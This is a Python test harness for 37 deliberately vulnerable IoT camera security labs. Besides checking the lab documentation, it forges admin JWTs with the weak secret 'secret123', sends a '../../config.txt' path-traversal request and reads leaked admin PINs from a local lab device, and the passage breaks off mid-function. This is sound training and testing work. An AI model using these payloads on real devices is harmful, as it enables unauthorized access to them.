#!/usr/bin/env python3
"""
Comprehensive Test Suite for All 37 Security Labs
Tests verify that each vulnerability exists and can be exploited.
"""

import sys
import json
import subprocess
from pathlib import Path

import re
import shutil
import os
import urllib.request
import urllib.parse
import socket
import time

# Test results
tests_passed = 0
tests_failed = 0
tests_skipped = 0

def print_header(text):
    """Print a formatted header"""
    print("\n" + "=" * 70)
    print(f"  {text}")
    print("=" * 70)

def print_test(lab_num, lab_name, status, message=""):
    """Print test result"""
    global tests_passed, tests_failed, tests_skipped

    status_symbol = {
        "PASS": "+",
        "FAIL": "-",
        "SKIP": "?"
    }

    status_color = {
        "PASS": "\033[92m",  # Green
        "FAIL": "\033[91m",  # Red
        "SKIP": "\033[93m"   # Yellow
    }

    reset = "\033[0m"

    symbol = status_symbol.get(status, "?")
    color = status_color.get(status, "")

    print(f"{color}[{symbol}] L{lab_num:02d}: {lab_name}{reset}")
    if message:
        print(f"    {message}")

    if status == "PASS":
        tests_passed += 1
    elif status == "FAIL":
        tests_failed += 1
    elif status == "SKIP":
        tests_skipped += 1

def test_jwt_tool():
    """Test L11: JWT forging tool (was L03)"""
    try:
        # Test forging (secret must be provided)
        result = subprocess.run(
            ["python3", "docs/labs/L10-weak-jwt/tools/forge_jwt.py", "forge", "--secret", "secret123", "--user", "admin", "--role", "admin"],
            capture_output=True,
            text=True,
            timeout=5
        )

        if result.returncode != 0:
            return False, "Failed to forge token"

        token = result.stdout.strip()

        # Verify token format (3 parts separated by dots)
        parts = token.split('.')
        if len(parts) != 3:
            return False, f"Invalid token format: {len(parts)} parts"

        # Test decoding
        result = subprocess.run(
            ["python3", "docs/labs/L10-weak-jwt/tools/forge_jwt.py", "decode", "--token", token],
            capture_output=True,
            text=True,
            timeout=5
        )

        if result.returncode != 0:
            return False, "Failed to decode token"

        decoded = json.loads(result.stdout)

        # Verify structure
        if "header" not in decoded or "payload" not in decoded:
            return False, "Missing header or payload in decoded token"

        if decoded["header"]["alg"] != "HS256":
            return False, f"Wrong algorithm: {decoded['header']['alg']}"

        if decoded["payload"]["user"] != "admin":
            return False, f"Wrong user: {decoded['payload']['user']}"

        if decoded["payload"]["role"] != "admin":
            return False, f"Wrong role: {decoded['payload']['role']}"

        # Test verification
        result = subprocess.run(
            ["python3", "docs/labs/L10-weak-jwt/tools/forge_jwt.py", "verify", "--secret", "secret123", "--token", token],
            capture_output=True,
            text=True,
            timeout=5
        )

        if "Valid: True" not in result.stdout:
            return False, "Token verification failed"

        return True, "JWT forging, decoding, and verification work correctly"

    except subprocess.TimeoutExpired:
        return False, "Test timed out"
    except Exception as e:
        return False, f"Exception: {str(e)}"

def test_jwt_rfc7519_format():
    """Test that JWT follows RFC 7519 format"""
    try:
        # Forge a token
        result = subprocess.run(
            ["python3", "docs/labs/L10-weak-jwt/tools/forge_jwt.py", "forge", "--secret", "secret123", "--user", "testuser", "--role", "user"],
            capture_output=True,
            text=True,
            timeout=5
        )

        token = result.stdout.strip()
        parts = token.split('.')

        # Decode and verify RFC 7519 compliance
        result = subprocess.run(
            ["python3", "docs/labs/L10-weak-jwt/tools/forge_jwt.py", "decode", "--token", token],
            capture_output=True,
            text=True,
            timeout=5
        )

        decoded = json.loads(result.stdout)

        # Check header
        header = decoded["header"]
        if "alg" not in header or "typ" not in header:
            return False, "Missing required header fields (alg, typ)"

        if header["typ"] != "JWT":
            return False, f"Wrong type: {header['typ']}, expected JWT"

        # Check payload
        payload = decoded["payload"]
        if "user" not in payload or "role" not in payload or "exp" not in payload:
            return False, "Missing required payload fields"

        # Check signature exists and is base64url encoded
        signature = decoded["signature"]
        if not signature or len(signature) < 10:
            return False, "Invalid signature"

        return True, "JWT follows RFC 7519 format correctly"

    except Exception as e:
        return False, f"Exception: {str(e)}"

def test_jwt_weak_secret():
    """Test that JWT uses weak secret 'secret123'"""
    try:
        # Forge with secret123
        result1 = subprocess.run(
            ["python3", "docs/labs/L10-weak-jwt/tools/forge_jwt.py", "forge", "--secret", "secret123", "--user", "user1", "--role", "admin"],
            capture_output=True,
            text=True,
            timeout=5
        )
        token1 = result1.stdout.strip()

        # Verify with secret123
        result = subprocess.run(
            ["python3", "docs/labs/L10-weak-jwt/tools/forge_jwt.py", "verify", "--secret", "secret123", "--token", token1],
            capture_output=True,
            text=True,
            timeout=5
        )

        if "Valid: True" not in result.stdout:
            return False, "Token doesn't verify with secret123"

        # Try with wrong secret
        result = subprocess.run(
            ["python3", "docs/labs/L10-weak-jwt/tools/forge_jwt.py", "verify", "--secret", "wrongsecret", "--token", token1],
            capture_output=True,
            text=True,
            timeout=5
        )

        if "Valid: False" not in result.stdout:
            return False, "Token verified with wrong secret (should fail)"

        return True, "JWT uses weak secret 'secret123' as expected"

    except Exception as e:
        return False, f"Exception: {str(e)}"

def test_documentation_completeness():
    """Test that all lab documentation exists and is complete"""
    labs_dir = Path("docs/labs")

    if not labs_dir.exists():
        return False, "docs/labs directory not found"

    missing_labs = []
    incomplete_labs = []

    for i in range(0, 40):
        lab_dir = labs_dir / f"L{i:02d}-*"
        matching_dirs = list(labs_dir.glob(f"L{i:02d}-*"))

        if not matching_dirs:
            missing_labs.append(i)
            continue

        # Lab doc is named after the directory (e.g., L00-device-setup.md)
        lab_dir_name = matching_dirs[0].name
        readme = matching_dirs[0] / f"{lab_dir_name}.md"
        if not readme.exists():
            # Fallback to README.md for backwards compatibility
            readme = matching_dirs[0] / "README.md"
        if not readme.exists():
            incomplete_labs.append(i)
            continue

        # Check file size (streamlined format: should be 200-400 lines)
        with open(readme, 'r') as f:
            lines = len(f.readlines())
            if lines < 200:
                incomplete_labs.append((i, lines))

    if missing_labs:
        return False, f"Missing labs: {missing_labs}"

    if incomplete_labs:
        details = ", ".join([
            (f"L{item[0]:02d}({item[1]} lines)" if isinstance(item, tuple) else f"L{item:02d}")
            for item in incomplete_labs
        ])
        return False, f"Incomplete labs (<200 lines): {details}"

    return True, "All 37 labs have complete documentation (streamlined format)"

def test_documentation_content():
    """Test that lab documentation contains required sections"""
    labs_dir = Path("docs/labs")
    required_sections = {
        "Background": ["Background", "What is"],
        "Goal": ["Goal", "Objective"],
        "Exploit": ["Exploit", "Attack", "Vulnerability"],
        "Defense": ["Defense", "Defensive", "Mitigation", "Protection", "Security"]
    }

    labs_with_missing_sections = []

    for i in range(0, 40):
        matching_dirs = list(labs_dir.glob(f"L{i:02d}-*"))
        if not matching_dirs:
            continue

        lab_dir_name = matching_dirs[0].name
        readme = matching_dirs[0] / f"{lab_dir_name}.md"
        if not readme.exists():
            readme = matching_dirs[0] / "README.md"
        if not readme.exists():
            continue

        with open(readme, 'r') as f:
            content = f.read()
            missing = []
            for section_name, keywords in required_sections.items():
                found = False
                for keyword in keywords:
                    if keyword in content:
                        found = True
                        break
                if not found:
                    missing.append(section_name)

            if missing:
                labs_with_missing_sections.append((i, missing))

    if labs_with_missing_sections:
        details = ", ".join([f"L{i:02d}({','.join(sections)})"
                            for i, sections in labs_with_missing_sections])
        return False, f"Labs missing sections: {details}"

    return True, "All labs contain required sections"

def test_device_test_file_exists():
    """Test that a modern device test file exists and includes all 37 labs.

    Legacy single-file layouts are no longer supported; we only require the
    current Unity test entry point in test/test_device_labs/test_main.cpp.
    """
    modern = Path("test/test_device_labs/test_main.cpp")

    if not modern.exists():
        return False, "test/test_device_labs/test_main.cpp not found"

    with open(modern, 'r') as f:
        content = f.read()

    # Diag cases that have been removed (labs merged/deleted):
    # 8 = OTA rollback (merged into L07)
    # 18 = camera forensics (removed - artificial)
    # 32 = crash forensics (removed - fabricated)
    removed_cases = {8, 18, 32}

    missing = []
    for i in range(1, 40):
        if i in removed_cases:
            continue
        if i < 10:
            name = f"RUN_TEST(t0{i})"
        else:
            name = f"RUN_TEST(t{i})"
        if name not in content:
            missing.append(i)

    if missing:
        return False, f"Missing device tests for labs (modern): {missing}"

    return True, "Device test file exists with all active diagnostic tests"


def run_diagnostic_modules_exist():
    """Test that lab test hooks exist in the real firmware.

    All labs now live in CameraDevice::run_diagnostic. This is a thin alias that
    keeps the historical test name but checks the real implementation.
    """
    return test_camera_device_test_hooks()

def test_camera_device_test_hooks():
    """Test that CameraDevice has test hooks"""
    camera_device_h = Path("src/CameraDevice.h")

    if not camera_device_h.exists():
        return False, "src/CameraDevice.h not found"

    with open(camera_device_h, 'r') as f:
        content = f.read()

        required_hooks = [
            "DEV_TEST_HOOKS",
            "dev_generateJWT",
            "dev_verifyJWT",
            "dev_getJWTSecret",
            "run_diagnostic"
        ]

        missing_hooks = []
        for hook in required_hooks:
            if hook not in content:
                missing_hooks.append(hook)

        if missing_hooks:
            return False, f"Missing test hooks: {missing_hooks}"

    return True, "CameraDevice has all required test hooks"

def test_l05_firmware_dump_commands():
    """Test L05: Firmware dump serial shell commands exist"""
    shell_file = Path("src/SerialShell.cpp")

    if not shell_file.exists():
        return False, "SerialShell.cpp not found"

    with open(shell_file, 'r') as f:
        content = f.read()

        # Check for UART protocol commands only
        # (I2C and SPI extraction should be done with external tools like Bus Pirate, XGecu, etc.)
        uart_commands = [
            "part-list", "partlist",
            "flashdump", "partdump", "nvs-dump", "memdump"
        ]

        missing = []

        for cmd in uart_commands:
            if cmd not in content:
                missing.append(cmd)

        if missing:
            return False, f"Missing commands: {missing}"

        # Check for function implementations
        required_functions = [
            "void SerialShell::listPartitions",
            "void SerialShell::dumpFlash",
            "void SerialShell::dumpPartition",
            "void SerialShell::dumpNVS"
        ]

        missing_funcs = []
        for func in required_functions:
            if func not in content:
                missing_funcs.append(func)

        if missing_funcs:
            return False, f"Missing functions: {missing_funcs}"

    return True, "All L05 firmware dump commands implemented"

def test_l04_documentation():
    """Test L04: Firmware Extraction documentation completeness"""
    readme = Path("docs/labs/L04-firmware-extraction/L04-firmware-extraction.md")

    if not readme.exists():
        return False, "L04 lab doc not found"

    with open(readme, 'r') as f:
        content = f.read()

        # Check for protocol sections
        required_sections = [
            "UART Protocol Extraction",
            "I2C Protocol Extraction",
            "SPI Protocol Extraction",
            "JTAG",
            "Firmware Analysis",
        ]

        missing = []
        for section in required_sections:
            if section not in content:
                missing.append(section)

        if missing:
            return False, f"Missing sections: {missing}"

        # Check that all five extraction options are explicitly mentioned
        required_methods = [
            "UART ROM bootloader",
            "UART serial shell",
            "SPI flash",
            "I2C (EEPROM/peripherals)",
            "JTAG/SWD",
        ]

        missing_methods = []
        for method in required_methods:
            if method not in content:
                missing_methods.append(method)

        if missing_methods:
            return False, f"Missing extraction methods in docs: {missing_methods}"

        # Check for I2C devices documentation
        i2c_devices = ["AXP2101", "BMI270", "BMM150", "BM8563"]
        missing_devices = []
        for device in i2c_devices:
            if device not in content:
                missing_devices.append(device)

        if missing_devices:
            return False, f"Missing I2C device docs: {missing_devices}"

        # Check for SPI protocol details
        spi_keywords = ["JEDEC ID", "0x9F", "0x03", "SPI Protocol"]
        missing_spi = []
        for keyword in spi_keywords:
            if keyword not in content:
                missing_spi.append(keyword)

        if missing_spi:
            return False, f"Missing SPI protocol details: {missing_spi}"

    return True, "L05 documentation is complete with all protocols"

def run_device_unity_tests():
    """
    Invoke PlatformIO device tests and parse the Unity summary.
    Returns (success: bool, message: str)
    """
    try:
        pio = shutil.which("platformio") or "./.venv/bin/platformio"
        cmd = [pio, "test", "-e", "M5CoreS3_test", "-v"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
        out = (result.stdout or "") + "\n" + (result.stderr or "")

        # Parse Unity summary line, e.g., "35 Tests 0 Failures 1 Ignored"
        m = re.search(r"(\d+)\s+Tests\s+(\d+)\s+Failures\s+(\d+)\s+Ignored", out)
        total = fails = ignored = None
        if m:
            total, fails, ignored = m.group(1), m.group(2), m.group(3)

        # Detect overall env status: e.g., "M5CoreS3_test:* [PASSED]"
        env = re.search(r"M5CoreS3_test.*\[(PASSED|FAILED)\]", out)
        env_status = env.group(1) if env else None

        status_ok = (result.returncode == 0) and (env_status in (None, "PASSED")) and (fails in (None, "0"))

        msg_parts = []
        if total is not None:
            msg_parts.append(f"{total} tests, {fails} failures, {ignored} ignored")
        if env_status:
            msg_parts.append(f"Env status: {env_status}")

        # Include a short tail of output for context
        tail_lines = [line for line in out.strip().splitlines() if line.strip()]
        tail = "\n".join(tail_lines[-5:]) if tail_lines else ""
        if tail:
            msg_parts.append("Summary tail:\n" + tail)
        return status_ok, "; ".join(msg_parts)

    except subprocess.TimeoutExpired:
        return False, "PlatformIO tests timed out"
    except FileNotFoundError:
        return False, "platformio not found; install or activate venv"
    except Exception as e:
        return False, f"Exception: {e}"

def _base_url():
    # Allow several env var names; default to AP IP
    return os.environ.get("CORES3_BASE") or os.environ.get("CORES3_URL") or os.environ.get("DEVICE_BASE_URL") or "http://192.168.4.1"

def _http_get_via_curl(path, params=None, headers=None, timeout=3, iface=None):
    """HTTP GET using curl, optionally binding to a specific interface (CORES3_IFACE).
    Uses binary capture to tolerate binary bodies (e.g., JPEG leak).
    """
    base = _base_url().rstrip('/')
    if params:
        qs = urllib.parse.urlencode(params, doseq=True, safe="/:")
        url = f"{base}{path}?{qs}"
    else:
        url = f"{base}{path}"
    args = ["curl", "-sS", "-m", str(timeout), "-i", url]
    if iface:
        args.extend(["--interface", iface])
    if headers:
        for k, v in (headers or {}).items():
            args.extend(["-H", f"{k}: {v}"])
    try:
        cp = subprocess.run(args, capture_output=True, timeout=timeout+1)
    except Exception:
        return False, None, {}, b""
    if cp.returncode != 0:
        return False, None, {}, b""
    data = cp.stdout or b""
    lines = data.split(b"\r\n")
    status = None
    hdrs = {}
    body_start = 0
    i = 0
    while i < len(lines):
        if lines[i].startswith(b"HTTP/"):
            # New header block
            try:
                status = int(lines[i].split()[1])
            except Exception:
                status = None
            hdrs = {}
            i += 1
            while i < len(lines) and lines[i].strip():
                if b":" in lines[i]:
                    k, v = lines[i].split(b":", 1)
                    try:
                        hdrs[k.decode().strip()] = v.decode(errors="ignore").strip()
                    except Exception:
                        pass
                i += 1
            # Next line after empty line is body start for this block
            body_start = i + 1
        i += 1
    body = b"\n".join(lines[body_start:]) if body_start < len(lines) else b""
    return (status is not None), status, hdrs, body


def _http_get(path, params=None, headers=None, timeout=3):
    iface = os.environ.get("CORES3_IFACE")
    if iface:
        return _http_get_via_curl(path, params=params, headers=headers, timeout=timeout, iface=iface)
    try:
        base = _base_url().rstrip('/')
        if params:
            qs = urllib.parse.urlencode(params, doseq=True, safe="/:")
            url = f"{base}{path}?{qs}"
        else:
            url = f"{base}{path}"
        req = urllib.request.Request(url, headers=headers or {}, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status = resp.getcode()
            info = dict(resp.getheaders())
            # Read up to 1024 bytes to avoid long downloads (e.g., stream)
            try:
                body = resp.read(1024)
            except Exception:
                body = b""
        return True, status, info, body
    except (urllib.error.URLError, urllib.error.HTTPError, socket.timeout, ConnectionError):
        return False, None, {}, b""




def _http_post_form(path, form_data=None, headers=None, timeout=3):
    try:
        base = _base_url().rstrip('/')
        url = f"{base}{path}"
        data = urllib.parse.urlencode(form_data or {}).encode()
        hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status = resp.getcode()
            info = dict(resp.getheaders())
            body = resp.read(1024)
        return True, status, info, body
    except urllib.error.HTTPError as e:
        # HTTP error responses (401, 403, 500, etc.) are still valid responses
        return True, e.code, dict(e.headers), e.read(1024)
    except (urllib.error.URLError, socket.timeout, ConnectionError):
        return False, None, {}, b""


def _wait_until_unreachable(timeout=25):
    import time as _time
    t0 = _time.time()
    while _time.time() - t0 < timeout:
        ok, status, _, _ = _http_get("/config", timeout=1)
        if not ok:
            return True
        _time.sleep(0.5)
    return False


def _esptool_reset():
    """Hard-reset the device via esptool (toggles RTS/DTR lines)."""
    import subprocess as _sp
    for cmd in ["esptool", "esptool.py"]:
        for port in ['/dev/ttyACM0', '/dev/ttyACM1']:
            try:
                cp = _sp.run(
                    [cmd, "--port", port, "--before", "default-reset",
                     "--after", "hard-reset", "chip-id"],
                    capture_output=True, text=True, timeout=15)
                if cp.returncode == 0:
                    print(f"     [~] Hard reset via esptool on {port}")
                    return True
            except FileNotFoundError:
                break  # this cmd doesn't exist, try next
            except Exception:
                continue
    # Fallback: serial 'reboot' command
    try:
        import serial as _serial
        for port in ['/dev/ttyACM0', '/dev/ttyACM1']:
            try:
                s = _serial.Serial(port, 115200, timeout=2)
                import time as _t
                _t.sleep(0.3)
                while s.in_waiting:
                    s.read(s.in_waiting)
                    _t.sleep(0.1)
                s.write(b'reboot\n')
                _t.sleep(0.5)
                s.close()
                print(f"     [~] Sent reboot via {port}")
                return True
            except Exception:
                continue
    except ImportError:
        pass
    return False


# Global flag to prevent cascading resets
_recovery_in_progress = False

def _get_arp_state(ip):
    """Return kernel ARP state for ip: REACHABLE, STALE, DELAY, FAILED, or NONE."""
    import subprocess as _sp
    try:
        cp = _sp.run(["ip", "neigh", "show", ip],
                     capture_output=True, text=True, timeout=3)
        parts = cp.stdout.strip().split()
        return parts[-1] if parts else "NONE"
    except Exception:
        return "UNKNOWN"


def _wait_for_arp_clear(ip, timeout=120):
    """Wait until ARP entry is NOT in FAILED state.

    On Linux, FAILED ARP entries block ALL traffic to the IP. The gc_stale_time
    sysctl (default 60s) controls when GC *may* clean up, but actual cleanup
    depends on GC scheduling and can take 60-120s+. We poll until cleared.
    """
    t0 = time.time()
    state = _get_arp_state(ip)
    if state != "FAILED":
        return True
    print(f"     [~] ARP is FAILED - waiting for kernel GC to clear (up to {timeout}s)...")
    while time.time() - t0 < timeout:
        time.sleep(10)
        state = _get_arp_state(ip)
        if state != "FAILED":
            elapsed = int(time.time() - t0)
            print(f"     [~] ARP cleared to {state} after {elapsed}s")
            return True
    print(f"     [~] ARP still FAILED after {timeout}s")
    return False


def _wait_for_http(timeout=90, verbose=False):
    """Poll until device HTTP is reachable. No resets --just wait and poll.

    IMPORTANT: Caller should ensure ARP is not in FAILED state before calling,
    otherwise all probes will fail. Use _wait_for_arp_clear() first.
    """
    import subprocess as _sp
    base_url = _base_url().rstrip('/')
    base_ip = base_url.replace("http://", "").split(":")[0]
    t0 = time.time()
    attempt = 0

    while time.time() - t0 < timeout:
        attempt += 1

        # Try curl for HTTP check (fresh process = fresh socket + ARP)
        try:
            cp = _sp.run(
                ["curl", "-s", "-m", "5", "--connect-timeout", "5",
                 f"{base_url}/config"],
                capture_output=True, text=True, timeout=8)
            http_ok = cp.returncode == 0 and "Device Configuration" in (cp.stdout or "")
        except Exception:
            http_ok = False

        if verbose and (attempt <= 3 or attempt % 5 == 0):
            arp_state = _get_arp_state(base_ip)
            elapsed = int(time.time() - t0)
            print(f"     [~] Poll #{attempt} ({elapsed}s): ARP={arp_state} curl={'OK' if http_ok else 'FAIL'}")
        if http_ok:
            return True
        time.sleep(5)
    return False


def _reset_and_wait():
    """Reset device via esptool and wait for full boot + HTTP ready.

    This is the ONE place that triggers resets. It waits 60s for boot,
    then polls for up to 60s more. Returns True if device is reachable.
    """
    global _recovery_in_progress
    if _recovery_in_progress:
        # Another recovery is already happening --just wait for HTTP
        return _wait_for_http(timeout=120)
    _recovery_in_progress = True
    try:
        base_ip = _base_url().replace("http://", "").split(":")[0]
        _esptool_reset()
        # Device needs ~55-65s: boot (~25s) + WiFi (~15s) + DHCP (~10s) + web server (~10s)
        # We wait 75s to ensure device is fully up before first HTTP probe,
        # because if we probe too early the kernel ARP cache goes to FAILED state
        # and the backoff timer prevents re-resolution for ~30s.
        print("     [~] Waiting 75s for device boot + WiFi + web server...")
        time.sleep(75)
        # After boot wait, ARP may be stuck in FAILED state from earlier
        # probes during boot. Wait for it to clear before polling HTTP.
        _wait_for_arp_clear(base_ip)
        result = _wait_for_http(timeout=60, verbose=True)
        if result:
            print("     [~] Device recovered successfully")
        return result
    finally:
        _recovery_in_progress = False


_device_up_checked = False
_device_up_result = False

def _ensure_device_up():
    """Ensure device is reachable. Checks once and caches the result.

    If no CORES3_BASE is explicitly set and the device doesn't respond
    to a quick check, returns False immediately (no long polling).
    Only does aggressive recovery if CORES3_BASE is explicitly set,
    indicating the user expects a live device.
    """
    global _device_up_checked, _device_up_result

    # If we already confirmed the device is up, quick re-check
    if _device_up_checked and _device_up_result:
        ok, status, _, _ = _http_get("/config", timeout=2)
        if ok and status == 200:
            return True
        # Single check failed - retry a few times before giving up.
        # The ESP32 single-connection web server can be briefly busy.
        for _ in range(4):
            time.sleep(1)
            ok, status, _, _ = _http_get("/config", timeout=3)
            if ok and status == 200:
                return True
        # Device went down after being up - try recovery
        _device_up_result = False

    # If already checked and failed, don't retry
    if _device_up_checked and not _device_up_result:
        return False

    _device_up_checked = True

    # Quick check (3 attempts, ~3s)
    for _ in range(3):
        ok, status, _, _ = _http_get("/config", timeout=2)
        if ok and status == 200:
            _device_up_result = True
            return True
        time.sleep(0.5)

    # Device not reachable on quick check.
    # If CORES3_BASE was not explicitly set, skip immediately.
    explicit_base = os.environ.get("CORES3_BASE") or os.environ.get("CORES3_URL") or os.environ.get("DEVICE_BASE_URL")
    if not explicit_base:
        print("     [~] Device not reachable (no CORES3_BASE set). Skipping live tests.")
        _device_up_result = False
        return False

    # CORES3_BASE explicitly set - user expects a live device. Try recovery.
    base_ip = _base_url().replace("http://", "").split(":")[0]
    arp_state = _get_arp_state(base_ip)
    if arp_state == "FAILED":
        _wait_for_arp_clear(base_ip, timeout=120)

    print("     [~] Polling for device HTTP (up to 90s)...")
    if _wait_for_http(timeout=90, verbose=True):
        _device_up_result = True
        return True

    print("     [~] Still unreachable, performing esptool reset...")
    result = _reset_and_wait()
    _device_up_result = result
    return result


def _http_headers_only(path, params=None, timeout=2):
    """Fetch only headers using curl when CORES3_IFACE is set to avoid streaming timeouts."""
    iface = os.environ.get("CORES3_IFACE")
    if not iface:
        # Fallback: regular GET
        return _http_get(path, params=params, headers=None, timeout=timeout)
    base = _base_url().rstrip('/')
    if params:
        qs = urllib.parse.urlencode(params, doseq=True, safe="/:")
        url = f"{base}{path}?{qs}"
    else:
        url = f"{base}{path}"
    args = ["curl", "-sS", "-m", str(timeout), "-D", "-", "-o", "/dev/null", "--interface", iface, url]
    try:
        cp = subprocess.run(args, capture_output=True, text=True, timeout=timeout+1)
    except Exception:
        return False, None, {}, b""
    # Even if curl timed out (exit 28), headers may be present; parse anyway
    lines = (cp.stdout or "").splitlines()
    status = None
    hdrs = {}
    i = 0
    while i < len(lines) and not lines[i].startswith("HTTP/"):
        i += 1
    if i < len(lines) and lines[i].startswith("HTTP/"):
        try:
            status = int(lines[i].split()[1])
        except Exception:
            status = None
        i += 1
        while i < len(lines) and lines[i].strip():
            if ":" in lines[i]:
                k, v = lines[i].split(":", 1)
                hdrs[k.strip()] = v.strip()
            i += 1
    return (status is not None), status, hdrs, b""

def _reachable():
    """Quick check if device is reachable (no recovery, no resets)."""
    for _ in range(3):
        ok, status, _, _ = _http_get("/config", timeout=2)
        if ok and status == 200:
            return True
        time.sleep(0.5)
    return False

_testlab_cached = None


def _testlab_available():
    """Return True if /diag appears to be implemented on this firmware."""
    global _testlab_cached
    if _testlab_cached is not None:
        return _testlab_cached
    if not _reachable():
        _testlab_cached = False
        return False
    ok, status, _, _ = _http_get("/diag", params={"id": 0}, timeout=1)
    _testlab_cached = bool(ok and status == 200)
    return _testlab_cached



def test_http_config_leak():
    """HTTP: L16 Unauth Config Access (/config)"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/config", timeout=2)
    if not ok or status != 200:
        return False, f"GET /config failed (status={status})"
    text = body.decode(errors="ignore")
    if "Device Configuration" in text and "Admin PIN:" in text and "User PIN:" in text:
        return True, "Config page leaks PINs without auth"
    return False, "Expected PINs not found in /config output"


def test_http_path_traversal():
    """HTTP: L10 Path Traversal (/file?name=../../config.txt)"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/file", params={"name": "../../config.txt"}, timeout=2)
    if not ok or status != 200:
        return False, f"GET /file failed (status={status})"
    text = body.decode(errors="ignore")
    if "admin_pin=" in text:
        return True, "Traversal leaks live admin_pin from config response"
    return False, "admin_pin not present in /file traversal response"


def _forge_admin_token():
    try:
        result = subprocess.run(
            ["python3", "docs/labs/L10-weak-jwt/tools/forge_jwt.py", "forge", "--secret", "secret123", "--user", "admin", "--role", "admin"],
            capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            return None
        return result.stdout.strip()
    except Exception:
        return None


def test_http_jwt_admin_access():
    """HTTP: L11 Weak JWT -> access /admin with forged token"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    tok = _forge_admin_token()
    if not tok:
        return False, "Failed to forge admin token"
    # Use query param for training build
    ok, status, headers, body = _http_get("/admin", params={"token": tok}, timeout=2)
    if ok and status == 200 and body.decode(errors="ignore").strip().endswith("OK"):
        return True, "Forged token grants admin access (200 OK)"
    return False, f"/admin did not return 200 OK (status={status})"


def test_http_testlab_overflow():
    """HTTP: L12 Buffer Overflow via /camera (crashes device - esptool reset after)"""
    return test_http_l12_camera_live_longinput()


def test_http_camera_frame_debug():
    """HTTP: L17 camera frame status via /camera/debug-frame"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/camera/debug-frame", timeout=2)
    if not ok or status != 200:
        return False, f"/camera/debug-frame failed (status={status})"
    text = body.decode(errors="ignore")
    if "Camera Frame Status" in text and "Full frame size" in text and "Preview frame size" in text:
        return True, "Camera frame debug endpoint present"
    return False, "Camera frame debug response did not match expected pattern"

# Cross-check helpers

def _get_pins_from_admin_nvs():
    tok = _forge_admin_token()
    if not tok:
        return None, None, "Failed to forge admin token"
    ok, status, headers, body = _http_get("/admin/nvs", params={"token": tok}, timeout=2)
    if not ok or status != 200:
        return None, None, f"GET /admin/nvs failed (status={status})"
    try:
        data = json.loads((body or b"").decode(errors="ignore"))
    except Exception as e:
        return None, None, f"Invalid JSON in /admin/nvs: {e}"
    return str(data.get("user_pin", "")), str(data.get("admin_pin", "")), None


def _extract_first_pin(text):
    m = re.search(r"\b(\d{6})\b", text or "")
    return m.group(1) if m else None


def test_http_uart_leak_matches_nvs():
    """HTTP: L01 UART leak contains the real admin PIN from NVS"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    up, ap, err = _get_pins_from_admin_nvs()
    if err:
        return False, err
    ok, status, headers, body = _http_get("/diag", params={"id": 1}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=1 failed (status={status})"
        return None, f"/diag id=1 unavailable (status={status}); skipping harness-only UART leak check"
    pin = _extract_first_pin((body or b"").decode(errors="ignore"))
    if pin and pin == ap:
        return True, "UART leak admin PIN matches NVS"
    return False, f"UART leak PIN mismatch (got={pin}, nvs={ap})"


def test_http_i2c_leak_matches_nvs():
    """HTTP: L02 I2C sniff shows real admin PIN from NVS"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    up, ap, err = _get_pins_from_admin_nvs()
    if err:
        return False, err
    ok, status, headers, body = _http_get("/diag", params={"id": 2}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=2 failed (status={status})"
        return None, f"/diag id=2 unavailable (status={status}); skipping harness-only I2C leak check"
    pin = _extract_first_pin((body or b"").decode(errors="ignore"))
    if pin and pin == ap:
        return True, "I2C leak admin PIN matches NVS"
    return False, f"I2C leak PIN mismatch (got={pin}, nvs={ap})"


def test_http_spi_debug_leak_matches_nvs():
    """HTTP: L03 SPI flash debug read shows real admin PIN from NVS"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    up, ap, err = _get_pins_from_admin_nvs()
    if err:
        return False, err
    ok, status, headers, body = _http_get("/diag", params={"id": 3}, timeout=2)
    if not ok or status != 200:
        if os.environ.get("REQUIRE_TEST_LAB") == "1":
            return False, f"/diag id=3 failed (status={status})"
        return None, f"/diag id=3 unavailable (status={status}); skipping harness-only SPI leak check"
    pin = _extract_first_pin((body or b"").decode(errors="ignore"))
    if pin and pin == ap:
        return True, "SPI debug leak admin PIN matches NVS"
    return False, f"SPI leak PIN mismatch (got={pin}, nvs={ap})"


def test_http_path_traversal_matches_nvs():
    """HTTP: L10 traversal leaks admin_pin matching NVS"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    up, ap, err = _get_pins_from_admin_nvs()
    if err:
        return False, err
    ok, status, headers, body = _http_get("/file", params={"name": "../../config.txt"}, timeout=2)
    if not ok or status != 200:
        return False, f"GET /file failed (status={status})"
    text = (body or b"").decode(errors="ignore")
    # Extract admin_pin specifically (not first PIN, which may be user_pin)
    m = re.search(r"admin_pin=(\d{6})", text)
    pin = m.group(1) if m else None
    if pin and pin == ap:
        return True, "Traversal leak admin_pin matches NVS"
    return False, f"Traversal admin_pin mismatch (got={pin}, nvs={ap})"


def test_http_config_pins_format():
    """HTTP: L16 config shows 6-digit User/Admin PINs"""
    if not _reachable():
        return None, "Device not reachable; set CORES3_BASE or connect to AP"
    ok, status, headers, body = _http_get("/config", timeout=2)
    if not ok or status != 200:
        return False, f"GET /config failed (status={status})"
    text = (body or b"").decode(errors="ignore")
    up = _extract_first_pin(re.search(r"User PIN:\s*(\d{6})", text or "") and re.search(r"User PIN:\s*(\d{6})", text).group(1) or "")
    ap = _extract_first_pin(re.search(r"Admin PIN:\s*(\d{6})", text or "") and re.search(r"Admin PIN:\s*(\d{6})", text).group(1) or "")
    if up and ap:
